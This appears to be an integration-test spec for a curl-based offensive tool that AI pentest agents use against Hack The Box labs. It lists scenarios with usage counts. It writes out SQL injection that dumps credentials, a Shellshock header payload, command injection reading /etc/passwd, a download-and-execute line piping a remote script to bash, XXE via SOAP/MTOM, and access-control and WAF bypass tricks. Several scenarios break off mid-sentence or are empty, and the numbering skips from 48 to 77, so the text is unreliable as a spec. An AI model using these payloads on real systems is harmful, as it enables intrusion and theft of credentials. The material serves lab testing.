# Integration Scenarios: curl
# Required HTB Machine: ANY web-facing box (curl is used on every engagement with HTTP)
# Recommended FIRST box: Bashed (easy Linux, /dev/phpbash.php gives immediate RCE
#   via inject, simple file upload paths, exercises request/inject/download_to_file)
# Alternative boxes by focus area:
#   - Shocker: Shellshock via header injection (inject with custom headers)
#   - Nibbles: File upload exploitation (upload method)
#   - Bank: Directory traversal + credential discovery (download/download_to_file)
#   - Hercules: Path traversal + ASPX upload + raw_response binary download
#   - DevArea: JSON API + JWT auth + SOAP/XML + FTP download
#   - Cobblestone: Form POST + SQL injection via body + no-redirect + vhost routing
#   - Kobold: POST inject with JSON body + encoding=none + insecure TLS
# Prerequisites: Target reachable on VPN, web server running on any port
# Run with: pytest tests/tools/test_curl.py -m integration --tool=curl \
#           --target=<IP> -v
#
# Data source: Trajectory analysis of 1,332 real curl calls across 25+ HTB engagements.
#   Method distribution: request=970, inject=282, download_to_file=64, upload=13, download=3
#   request breakdown: GET=601, POST=362, HEAD=4, PUT=2, OPTIONS=1
#   request features: custom_headers=460, insecure=425, with_body=362, cookie=151,
#     no_redirect=65, auth=26, debug=37 (level1=23, level2=10, level3=4),
#     raw_response=5, custom_ua=0 (all used default)
#   inject breakdown: GET=279, POST=3, encoding_url=279, encoding_none=3,
#     with_headers=73, with_cookie=0, with_body=3
#   inject command types: cat_file=100, ls=80, other=77, script_exec=13,
#     cat_passwd=6, download_exec=3, id=3
#   upload breakdown: 13 calls, extensions=odt(4)/jpg(3)/aspx(2)/xlsx(1)/docx(1)/dll(1)/phtml(1),
#     all had extra_fields, all had cookie, 8 used is_base64
#   download_to_file: 64 calls, includes FTP URLs, GitHub SecLists, HTB artifacts
#   download: 3 calls (rarely used; agents prefer download_to_file)
#   Error rate: <0.1% (1 unknown error out of 1,332 calls)
#   Header patterns: Content-Type=344, Host=137, Authorization=30, Accept=20,
#     Referer=14, SOAPAction=5, Cookie=5, X-API-Key=1, X-Original-URL=1,
#     X-Forwarded-For=1, X-CSRFToken=1

# BASIC REQUEST SCENARIOS (request method)

## Scenario 1: Simple GET request (the most common pattern - 601 GET calls)
Method: request
Args: {url: "http://<IP>/"}
Expected: success=true, status_code=200, body contains HTML, timing.total_ms > 0,
  timing.dns_lookup_ms >= 0, timing.remote_ip matches <IP>
Notes: Basic connectivity test. Every engagement starts here. Verify response
  headers (Server, X-Powered-By, Set-Cookie) and timing data. The default
  User-Agent is "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
  which blends with normal browser traffic. Body is capped at 50,000 chars.

## Scenario 2: GET with custom headers - Host header vhost routing (137 Host headers)
Method: request
Args: {url: "http://<IP>/", headers: {"Host": "target.htb"}}
Expected: success=true, response may differ from Scenario 1 (different vhost content)
Notes: Virtual host routing is the #1 use of custom headers in real engagements.
  137 calls used Host header to reach vhosts (e.g., deploy.cobblestone.htb,
  mcp.kobold.htb). Often the default vhost returns a redirect or placeholder
  while the named vhost returns the actual application.

## Scenario 3: GET with multiple custom headers for recon
Method: request
Args: {url: "http://<IP>/", headers: {"Host": "target.htb", "X-Forwarded-For": "127.0.0.1", "X-Real-IP": "127.0.0.1", "Accept": "text/html"}}
Expected: success=true, status_code present
Notes: Tests combined header injection. X-Forwarded-For and X-Real-IP may bypass
  IP-based access controls. Real data shows Accept used 20 times, X-Forwarded-For
  and X-Real-IP used for ACL bypass testing.

## Scenario 4: POST with form-urlencoded data (362 POST calls, dominant pattern)
Method: request
Args: {url: "http://<IP>/login.php", method: "POST", data: "username=admin&password=test", headers: {"Content-Type": "application/x-www-form-urlencoded"}}
Expected: success=true, status_code present, body contains login response
Notes: Form POST is the most common POST pattern. Content-Type header was used in
  344 calls (overwhelmingly for POST). Real examples include login forms, search
  forms, and SQL injection payloads in form data.

## Scenario 5: POST with JSON body (common API pattern)
Method: request
Args: {url: "http://<IP>/api/login", method: "POST", data: "{\"username\": \"admin\", \"password\": \"test\"}", headers: {"Content-Type": "application/json"}}
Expected: success=true, body contains JSON response
Notes: JSON APIs are heavily used in modern HTB boxes. Real examples:
  token-auth endpoints, middleware configuration, MCP API exploitation.
  The body/data alias both work identically.

## Scenario 6: POST with JSON body using 'body' alias
Method: request
Args: {url: "http://<IP>/api/auth", method: "POST", body: "{\"username\": \"admin\", \"password\": \"test\"}", headers: {"Content-Type": "application/json"}}
Expected: success=true, identical behavior to using 'data' parameter
Notes: The 'body' parameter is an alias for 'data'. Both are accepted. The server
  uses body if provided, falls back to data. Test both to ensure parity.

## Scenario 7: HEAD request for server fingerprinting (4 real HEAD calls)
Method: request
Args: {url: "http://<IP>/", method: "HEAD"}
Expected: success=true, headers contain Server/X-Powered-By, body="" (empty)
Notes: Fingerprint web server version without downloading body. Real usage:
  checking if uploaded files exist (HEAD on uploaded file URL to verify presence
  before attempting execution). Status 200 = file exists, 404 = upload failed.

## Scenario 8: OPTIONS request for method discovery (1 real call)
Method: request
Args: {url: "http://<IP>/", method: "OPTIONS"}
Expected: success=true, headers contain Allow with supported methods
Notes: Discover allowed HTTP methods. Look for PUT/DELETE which may allow
  direct file upload or resource deletion. Rarely used in practice but
  critical when found (PUT on WebDAV = file upload without form).

## Scenario 9: PUT request for WebDAV or API updates (2 real PUT calls)
Method: request
Args: {url: "http://<IP>/api/v2/config", method: "PUT", data: "{\"binary\": \"/bin/bash\", \"script\": \"#!/bin/bash\\nid\"}", headers: {"Content-Type": "application/json", "Authorization": "Bearer <token>"}}
Expected: success=true, status_code 200/201/204
Notes: PUT used for API modifications after auth. Real example: updating
  HoverFly middleware configuration with reverse shell payload. Always
  requires authentication (Bearer token or session cookie).

## Scenario 10: Request with cookies for session hijacking (151 cookie calls)
Method: request
Args: {url: "http://<IP>/admin/", cookie: "PHPSESSID=abc123; admin=true"}
Expected: success=true (may be 401/403), response captured
Notes: Cookie injection is the 4th most used feature (151 calls). Used for
  session fixation, privilege escalation (admin=true cookie), and maintaining
  authenticated sessions across multiple requests. All 13 upload calls also
  used cookies for authenticated uploads.

## Scenario 11: Request with Bearer token authorization (30 Authorization headers)
Method: request
Args: {url: "http://<IP>/api/users", headers: {"Authorization": "Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0.rTCH8cLoGxAm_xw68z-zXVKi9ie6xJn9tnVWjd_9ftE"}}
Expected: success=true, response from authenticated API endpoint
Notes: Bearer token auth was the 3rd most used header (30 calls). Real
  engagements used JWT tokens obtained from auth endpoints. Test with both
  valid and invalid/expired tokens to verify error handling.

## Scenario 12: Request with Basic auth (26 auth param calls)
Method: request
Args: {url: "http://<IP>/admin/", auth: "admin:password123"}
Expected: status_code 200 or 401, captured response
Notes: The auth parameter adds HTTP Basic Authentication. 26 real calls.
  Used for services like Tomcat manager, Jenkins, basic-auth-protected
  admin panels. Check for 401 vs 200 to confirm valid credentials.

## Scenario 13: Request with no-redirect to see redirect chain (65 calls)
Method: request
Args: {url: "http://<IP>/admin/", follow_redirects: false}
Expected: success=true, status_code=301/302/303/307, headers contain location
Notes: Disabling redirects is critical for login flow analysis. 65 real calls
  used follow_redirects=false. Reveals: redirect targets after login, session
  cookie set on redirect response, SSRF redirect chains. The Location header
  shows where the server wants to redirect. Default is follow_redirects=true
  with max 10 redirects.

## Scenario 14: HTTPS request with insecure flag (425 insecure calls)
Method: request
Args: {url: "https://<IP>/", insecure: true}
Expected: success=true, response captured despite self-signed cert
Notes: insecure=true was used in 425 calls (32% of all requests). HTB boxes
  almost always use self-signed certificates. Without this flag, HTTPS
  requests fail with ssl_certificate_error. This is the #3 most used feature.

## Scenario 15: Request with debug level 1 (23 real calls)
Method: request
Args: {url: "http://<IP>/", debug_level: 1}
Expected: success=true, response.debug.request_headers contains sent headers
Notes: Debug level 1 adds -v flag and parses request headers from stderr.
  Useful for verifying exactly what headers curl sent. Real usage: 23 calls
  at level 1, 10 at level 2, 4 at level 3. Used when responses are unexpected
  and the agent needs to verify the actual wire format.

## Scenario 16: Request with debug level 2 (verbose output)
Method: request
Args: {url: "http://<IP>/", debug_level: 2}
Expected: success=true, response.debug.verbose_output contains full curl -v output
Notes: Level 2 includes the full verbose output (TLS handshake, connection
  details, header exchange). Capped at 10,000 chars. Useful for diagnosing
  TLS issues, proxy problems, or connection failures.

## Scenario 17: Request with debug level 3 (full trace)
Method: request
Args: {url: "http://<IP>/", debug_level: 3}
Expected: success=true, response.debug.verbose_output contains trace-level detail
Notes: Maximum verbosity. 4 real calls. Used for deeply troublesome connections
  where level 2 was insufficient. Includes binary data representation.

## Scenario 18: Request with raw_response for binary content (5 real calls)
Method: request
Args: {url: "https://<IP>/Home/Download?fileName=../../bin/target.dll", method: "GET", raw_response: true, insecure: true}
Expected: success=true, response.body_base64 contains base64-encoded binary,
  body_length > 0
Notes: raw_response=true captures binary data as base64. Real usage: downloading
  .dll, .pdb, .cshtml files via path traversal on Hercules HTB. The body field
  still contains the UTF-8 decoded version (may be garbled for binary). Use
  body_base64 for accurate binary content.

## Scenario 19: POST with SQL injection payload in form body
Method: request
Args: {url: "http://<IP>/search.php", method: "POST", data: "url=' UNION ALL SELECT NULL,GROUP_CONCAT(username,0x3a,password SEPARATOR 0x0a),NULL,NULL,NULL FROM users-- -", headers: {"Content-Type": "application/x-www-form-urlencoded"}}
Expected: success=true, body may contain extracted database content
Notes: Real pattern from Cobblestone HTB. SQL injection via POST form data.
  The curl tool sends the payload as-is in the body. The agent handles SQL
  syntax construction; curl is just the transport. Also seen: LOAD_FILE()
  for reading server files via SQL injection.

## Scenario 20: POST with XML/SOAP body (5 SOAPAction calls)
Method: request
Args: {url: "http://<IP>/employeeservice", method: "POST", data: "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:dev=\"http://target.htb/\">\n  <soapenv:Header/>\n  <soapenv:Body>\n    <dev:getVersion/>\n  </soapenv:Body>\n</soapenv:Envelope>", headers: {"Content-Type": "text/xml; charset=UTF-8", "SOAPAction": "\"\""}}
Expected: success=true, body contains SOAP response XML
Notes: SOAP/XML exploitation from DevArea HTB. 5 calls with SOAPAction header.
  Content-Type must be text/xml. Real payloads included XOP (XML-binary Optimized
  Packaging) multipart for file read via XXE. The SOAPAction header is often
  empty ("") but required for the server to process the request.

## Scenario 21: POST with multipart SOAP/XOP body (XXE via MTOM)
Method: request
Args: {url: "http://<IP>/employeeservice", method: "POST", data: "------=_Part_1\r\nContent-Type: application/xop+xml; charset=UTF-8; type=\"text/xml\"\r\nContent-Transfer-Encoding: 8bit\r\nContent-ID: <root.message@cxf.apache.org>\r\n\r\n<soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"><soap:Body><submitReport/></soap:Body></soap:Envelope>\r\n------=_Part_1--", headers: {"Content-Type": "multipart/related; type=\"application/xop+xml\"; start=\"<root.message@cxf.apache.org>\"; boundary=\"----=_Part_1\"", "SOAPAction": "\"\""}}
Expected: success=true, response from SOAP endpoint
Notes: Advanced SOAP exploitation using MTOM/XOP for XXE attacks. Real pattern
  from DevArea HTB with multiple parts. The multipart boundary must match between
  Content-Type header and body delimiters exactly.

## Scenario 22: Request with CSRF token header
Method: request
Args: {url: "http://<IP>/api/settings", method: "POST", data: "{\"key\": \"value\"}", headers: {"Content-Type": "application/json", "X-CSRFToken": "<token>", "Referer": "http://<IP>/"}, cookie: "session=<sid>; csrftoken=<token>"}
Expected: success=true, CSRF-protected endpoint accepts request
Notes: Referer header used 14 times in real data. CSRF tokens seen in both
  headers (X-CSRFToken, X-pgA-CSRFToken) and cookies. The Referer must match
  the expected origin or the server may reject the request.

## Scenario 23: Request with X-Original-URL / X-Rewrite-URL bypass
Method: request
Args: {url: "http://<IP>/allowed-path", headers: {"X-Original-URL": "/admin/panel", "X-Rewrite-URL": "/admin/panel"}}
Expected: success=true, may return admin panel content despite requesting allowed path
Notes: URL rewrite header bypass for WAF/reverse proxy. Both X-Original-URL and
  X-Rewrite-URL were used in real engagements (1 call each). The proxy sees the
  allowed URL but forwards X-Original-URL to the backend, bypassing path-based
  access controls.

## Scenario 24: Request with high timeout for slow targets
Method: request
Args: {url: "http://<IP>/slow-endpoint", timeout: 120, connect_timeout: 30}
Expected: success=true, timing.total_ms may be high
Notes: 2 real calls used timeout > 60s. Default is 30s request / 10s connect.
  Slow endpoints include: heavy database queries, file processing, deliberately
  slow pages (tar pit). connect_timeout is separate from request timeout.

## Scenario 27: Command injection via GET - URL encoding (279 GET + 279 url-encoded)
Method: inject
Args: {url: "http://<IP>/vuln.php?cmd={PAYLOAD}", command: "id", encoding: "url"}
Expected: success=true, output contains "uid="
Notes: The dominant injection pattern. 279 of 282 inject calls used GET with
  url encoding. {PAYLOAD} is replaced with url_quote(command). The output is
  auto-extracted: HTML tags stripped, entities decoded, whitespace normalized.
  Verify extracted_output is clean (no HTML artifacts).

## Scenario 28: Inject with file read command (100 cat_file calls - most common)
Method: inject
Args: {url: "http://<IP>/vuln.php?cmd={PAYLOAD}", command: "cat /etc/passwd", encoding: "url"}
Expected: success=true, output contains "root:x:0:0:"
Notes: File reading was the #1 inject command type (100 calls). Common targets:
  /etc/passwd, /etc/shadow, config files, application source code, SSH keys.
  The URL encoding handles spaces and special chars in the command.

## Scenario 29: Inject with directory listing (80 ls calls - 2nd most common)
Method: inject
Args: {url: "http://<IP>/vuln.php?cmd={PAYLOAD}", command: "ls -la /var/www/html/", encoding: "url"}
Expected: success=true, output contains directory listing
Notes: Directory listing was the #2 command type (80 calls). Used for
  enumeration after gaining RCE: finding config files, uploaded content,
  writable directories, suid binaries.

## Scenario 30: Inject with complex piped commands (77 "other" commands)
Method: inject
Args: {url: "http://<IP>/vuln.php?cmd={PAYLOAD}", command: "ps aux | grep -v '\\[' | head -40", encoding: "url"}
Expected: success=true, output contains process list
Notes: Complex piped commands were common (77 calls). Real examples from
  engagement data: "find / -name user.txt 2>/dev/null", "ps aux | grep target",
  "grep -r password /etc/ 2>/dev/null | tail -5". Pipes, redirects, and
  semicolons all work within the command parameter.

## Scenario 31: Inject with find command for flag discovery
Method: inject
Args: {url: "http://<IP>/vuln.php?cmd={PAYLOAD}", command: "find / -name user.txt 2>/dev/null; find / -name root.txt 2>/dev/null", encoding: "url"}
Expected: success=true, output contains file paths
Notes: Real pattern from engagement data. Semicolons chain commands.
  stderr redirect (2>/dev/null) suppresses permission denied noise.

## Scenario 32: Inject with process monitoring (loop commands)
Method: inject
Args: {url: "http://<IP>/vuln.php?cmd={PAYLOAD}", command: "for i in 1 2 3 4 5; do ps aux | grep target | grep -v grep; sleep 2; done", encoding: "url"}
Expected: success=true, output contains multiple snapshots of process list
Notes: Real pattern: monitoring cron jobs or intermittent processes. The sleep
  and loop run server-side. Timeout should be generous (30s default is fine
  for short loops, increase for longer monitoring).

## Scenario 33: Inject with script execution (13 script_exec calls)
Method: inject
Args: {url: "http://<IP>/vuln.php?cmd={PAYLOAD}", command: "python3 -c 'import os; os.system(\"id\")'", encoding: "url"}
Expected: success=true, output contains uid
Notes: Script execution via python/php/perl was used 13 times. Real examples:
  fontforge Python scripting, PHP one-liners for file operations. URL encoding
  handles quotes and special characters correctly.

## Scenario 34: Inject with download+execute pattern (3 download_exec calls)
Method: inject
Args: {url: "http://<IP>/vuln.php?cmd={PAYLOAD}", command: "curl http://10.10.16.50:8000/linpeas.sh | bash", encoding: "url"}
Expected: success=true, output from executed script
Notes: Download and execute in one command. 3 real calls. Used to deploy
  enumeration scripts or reverse shells. The nested curl within the command
  is URL-encoded as part of the payload.

## Scenario 35: Inject via POST body with {PAYLOAD} placeholder (3 real POST inject calls)
Method: inject
Args: {url: "http://<IP>/api/exec", command: "id", method: "POST", data: "{\"serverConfig\": {\"command\": \"bash\", \"args\": [\"-c\", \"{PAYLOAD}\"], \"env\": {}}, \"serverId\": \"exploit\"}", encoding: "none"}
Expected: success=true, output contains uid
Notes: POST injection with JSON body. Real pattern from Kobold HTB. The
  {PAYLOAD} placeholder in the data/body field is replaced with the encoded
  command. encoding=none used because the command is embedded in JSON (which
  handles its own escaping). All 3 POST inject calls used encoding=none.

## Scenario 36: Inject with encoding=none for pre-formatted payloads (3 real calls)
Method: inject
Args: {url: "http://<IP>/api/endpoint", command: "cat /etc/hostname", method: "POST", body: "{\"cmd\": \"{PAYLOAD}\"}", encoding: "none"}
Expected: success=true, output contains hostname
Notes: encoding=none sends the command as-is without URL/base64 encoding.
  Used when the payload is embedded in structured data (JSON, XML) where
  additional encoding would break the structure. All 3 real uses were POST+JSON.

## Scenario 37: Inject with base64 encoding for WAF bypass
Method: inject
Args: {url: "http://<IP>/vuln.php?cmd={PAYLOAD}", command: "id", encoding: "base64"}
Expected: success=true, command sent as base64 (e.g., "aWQ=")
Notes: 0 real calls with base64 encoding, but the capability exists and is
  important for WAF bypass. The server must decode: e.g., the vulnerable
  endpoint runs `echo {PAYLOAD} | base64 -d | bash`. Include for coverage
  since WAF evasion scenarios require this.

## Scenario 38: Inject with double-URL encoding for WAF bypass
Method: inject
Args: {url: "http://<IP>/vuln.php?cmd={PAYLOAD}", command: "id", encoding: "double-url"}
Expected: success=true, command double-URL-encoded
Notes: 0 real calls, but critical for IDS/WAF evasion. Double encoding
  bypasses single-decode WAFs: the first URL decode by the WAF produces
  still-encoded text, and the second decode by the backend recovers the
  command. Example: space becomes %2520 instead of %20.

## Scenario 39: Inject with output markers for clean extraction
Method: inject
Args: {url: "http://<IP>/vuln.php?cmd={PAYLOAD}", command: "whoami", output_markers: {start: "<!--START-->", end: "<!--END-->"}}
Expected: success=true, extracted_output is clean (no HTML surrounding content)
Notes: 0 real calls used output_markers (agents relied on strip_html instead).
  Useful when the vulnerable page embeds output between known markers. The
  markers support start-only, end-only, or both. Regex extraction with re.DOTALL
  handles multiline output.

## Scenario 40: Inject with strip_html=false for raw output
Method: inject
Args: {url: "http://<IP>/vuln.php?cmd={PAYLOAD}", command: "cat /var/www/html/index.php", encoding: "url", strip_html: false}
Expected: success=true, output contains raw HTML/PHP source
Notes: Default strip_html=true removes HTML tags. Set to false when the
  command output IS HTML/PHP source code that you need to read. Without this,
  PHP tags and HTML structure would be stripped from file contents.

## Scenario 41: Inject with custom headers (73 inject calls with headers)
Method: inject
Args: {url: "http://<IP>/cgi-bin/vuln.sh", command: "id", headers: {"User-Agent": "() { :; }; echo; echo; /bin/bash -c '{PAYLOAD}'"}, encoding: "none"}

Notes: 73 inject calls used custom headers. The most notable pattern is
  Shellshock exploitation where the payload is in the User-Agent header

## Scenario 42: Inject with cookie-based session
Method: inject
Args: {url: "http://<IP>/admin/exec.php?cmd={PAYLOAD}", command: "id", cookie: "PHPSESSID=valid_session_id"}
Expected: success=true, authenticated RCE
Notes: Authenticated command injection after login. The cookie maintains

## Scenario 43: Inject with HTTPS and insecure flag
Method: inject
Args: {url: "https://<IP>/api/exec?cmd={PAYLOAD}", command: "id", encoding: "url", insecure: true}
Expected: success=true, output contains uid
Notes: Many HTB boxes serve RCE endpoints over HTTPS with self-signed certs.

## Scenario 44: Inject with debug for troubleshooting failed RCE
Method: inject
Args: {url: "http://<IP>/vuln.php?cmd={PAYLOAD}", command: "id", encoding: "url", debug_level: 2}

Notes: When RCE appears to fail (empty output, wrong status), debug_level

## Scenario 45: Inject with elevated timeout for long-running commands
Method: inject
Args: {url: "http://<IP>/vuln.php?cmd={PAYLOAD}", command: "find / -perm -4000 -type f 2>/dev/null", encoding: "url", timeout: 90}
Expected: success=true, output contains SUID binaries
Notes: Some enumeration commands (find across entire filesystem, large grep)

## Scenario 48: Upload with double extension bypass (filter evasion)

## Scenario 77: Follow redirect chain and parse final response
Method: request
Args: {url: "http://<IP>/", follow_redirects: true}
Expected: success=true, status_code from FINAL response (not 301/302),
  headers from final response, body from final response
Notes: The response parser handles redirect chains by finding the LAST HTTP
  status line in the output. For a chain like 301->302->200, only the 200
  response headers and body are returned. Intermediate responses are discarded.
  This is the default behavior (follow_redirects=true).
